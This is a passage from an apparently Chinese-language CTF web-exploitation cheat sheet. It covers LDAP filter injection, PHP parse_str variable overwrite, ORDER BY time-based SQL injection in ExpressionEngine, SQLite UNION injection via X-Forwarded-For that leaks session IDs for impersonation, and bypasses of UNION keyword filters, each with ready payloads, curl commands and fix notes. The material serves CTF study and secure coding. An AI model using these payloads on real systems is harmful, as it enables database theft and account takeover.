(&(GivenName=*))(|(uid=*)(!(GivenName=Flag)))

# `&` 现在只看到 (GivenName=*)，后面的析取和剩余否定
# 变成被忽略的额外过滤组件。
```

```python
import requests
r = requests.get("http://target/search", params={"name": "*))(|(uid=*"})
print(r.text)
```

**关键点：** LDAP 过滤器使用前缀记法的布尔树：`&` / `|` / `!` 后跟带括号的子节点。未转义的用户输入包含 `)`、`(`、`*` 或 `\` 时，攻击者可以重新平衡这棵树。常见 payload：`*)(uid=*`（OR 通配）、`*))(&(1=1)`（强制为真）、`foo)(|(password=*)`（枚举记录）。服务端应对 `\28`、`\29`、`\2a`、`\5c` 做转义。

**参考：** CSAW CTF Qualification Round 2018 — ldab，writeup 11207

---

<a id="php-parse_str-variable-injection-tokyowesterns-2018"></a>
## PHP parse_str() 变量注入（TokyoWesterns 2018）

**模式：** PHP 的 `parse_str($str)` 不传结果数组时，会把查询字符串中的每个键写成当前作用域的局部变量。攻击者可控的键可以覆盖 `$hashed_password` 等认证变量，而脚本会拿它和预计算哈希比较。

```php
// 有漏洞
parse_str($_SERVER['QUERY_STRING']);  // $hashed_password ← 攻击者输入
if (md5($password) === $hashed_password) { login(); }

// 安全写法
parse_str($_SERVER['QUERY_STRING'], $params);
```

```bash
# 直接从查询字符串设置目标变量
curl "http://target/auth.php?action=auth&password=anything&hashed_password=$(php -r 'echo md5("anything");')"
```

**关键点：** `parse_str()` 和 `extract()` 是 register_globals 风格的元语：客户端发送的任何参数都会变成 PHP 变量，可能覆盖开发者以为只在局部存在的逻辑。修复方式是始终使用双参数形式。审计 PHP 时，grep 没有逗号的 `parse_str\(\s*\$[^,]*\)`。

**参考：** TokyoWesterns CTF 4th 2018 — SimpleAuth，writeup 11034

---

<a id="expressionengine-filemanager-order-by-sort-key-sqli-35c3-2018"></a>
## ExpressionEngine FileManager ORDER BY 排序键 SQLi（35C3 2018）

**模式：** ExpressionEngine 的文件管理器端点从客户端接收 `tbl_sort` 数组，并把每个 `[column, direction]` 对直接传给 `$db->order_by($key, $val)`。列名没有白名单就拼进 SQL，攻击者因此控制了 `ORDER BY` 表达式。

```http
POST /cp/tbl_sort[0][]=(select if(substr(user_password,1,1)='a',sleep(5),0) from exp_members) tbl_sort[0][]=ASC
```

在排序表达式中使用 `sleep()` / `benchmark()`，对管理员密码哈希做时间盲注。

**关键点：** 任何允许客户端选择排序列的 ORM 都必须做白名单。这种攻击尤其隐蔽，因为关注 `SELECT`/`UNION` 关键字的 WAF 很少拦截 `ORDER BY` 子查询。

**参考：** 35C3 CTF 2018 — ExpressionEngine filemanager SQLi，writeup 12880

---

<a id="sqlite-union-via-x-forwarded-for-with-phpsessid-oracle-ncsc-2019"></a>
## 通过 X-Forwarded-For 的 SQLite UNION 与 PHPSESSID 预言（NCSC 2019）

**模式：** 会话初始化逻辑构造 `SELECT ... FROM nxf8_sessions WHERE ip_address = '<X-Forwarded-For>'`，并把结果行复制进 `PHPSESSID` cookie。UNION 行最后一列的值会变成 cookie——一条免费的一次性外带通道。报错 `unrecognized token` 暴露了 SQLite；用 `sqlite_master` 枚举。

```bash
# 探测列数（该表 4 列）
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,null from nxf8_users where '1'='1"

# 从 sqlite_master 泄露表定义
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sql from sqlite_master where tbl_name='nxf8_users' and type='table"

# 外带指定行（用户 5 的 session_id）
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,session_id from nxf8_sessions where user_id=5 and '1'='1"
# -> Set-Cookie: PHPSESSID=<泄露值>
```
用 `null` 列补齐，直到 UNION 列数匹配；把目标表达式放在值会被反射进 cookie 的那一列。把泄露的 `session_id` 当作自己的 `PHPSESSID`，即可冒充目标用户（如 Maria）。

**关键点：** 会话 ID 生成逻辑经常包含未清洗的 HTTP 头（`X-Forwarded-For`、`Client-IP`、`True-Client-IP`）。被反射的结果行就是一个免费预言：不需要报错或时间推断。SQLite 特有的 UNION 用 `null` 补齐列数，并用 `sqlite_master(type,name,tbl_name,sql)` 做 schema 枚举（没有 `information_schema`）。

**参考：** Quals Saudi and Oman National Cyber Security CTF 2019 — Maria，writeup 13236

---

<a id="quote-adjacent-union-keyword-filter-bypass-tamuctf-2019"></a>
## 引号相邻的 UNION 关键字过滤绕过（TAMUctf 2019）

**模式：** 应用拦截 `UNION`，但天真地只查找 `" UNION "`（空格分隔）。SQL 词法分析器把闭合引号当作 token 边界，因此字符串字面量闭合后 `'UNION` 仍会被解析为关键字 `UNION`。把 `UNION` 紧贴闭合引号就能绕过字符串过滤，解析器依然接受。

```sql
-- 原始：SELECT items FROM Search WHERE items='<input>';
-- 被拦（过滤器看到 " UNION "）：
aggies' UNION SELECT 1; #

-- 绕过（UNION 前无空格——过滤器看到嵌在 "aggies'UNION" 里的 "UNION"）：
aggies'UNION SELECT 1; #

-- 完全去掉字符串前缀：
'UNION SELECT @@VERSION #
'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema!='information_schema' #
'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema!='information_schema' #
'UNION ALL SELECT grantee FROM information_schema.user_privileges #
```

**关键点：** 天真的黑名单只查找空白分隔的关键字，但 SQL 词法分析器容忍紧贴引号的 token——闭合 `'` 对解析器来说就是隐式空白。同样的技巧适用于 `/*!50000UNION*/`、制表符/换行（`%09`、`%0a`）、括号（`UNION(SELECT...)`）和注释块（`UNION/**/SELECT`）。另外可以探测 `information_schema.user_privileges` 的 `grantee` 列——CTF 出题人常把 flag 藏在特权用户名里。

**参考：** TAMUctf 2019 — Bird Box Challenge，writeup 13860
